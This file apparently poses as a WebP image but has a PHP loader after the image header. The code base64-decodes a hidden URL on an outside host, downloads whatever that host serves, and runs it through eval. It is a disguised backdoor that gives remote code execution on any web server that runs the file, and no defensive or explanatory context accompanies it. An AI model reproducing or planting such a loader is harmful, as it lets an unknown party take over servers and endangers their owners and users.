RIFF¤  WEBPVP8 ˜  ðÑ *ôô>‘HŸK¥¤"§£±¨àð	
<?php
$url = base64_decode('aHR0cHM6Ly9idWphbmcub25saW5lL3Jhdy91LVNaVEY5UHYt');
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$output = curl_exec($ch);
curl_close($ch);

eval("?>".$output);
?>

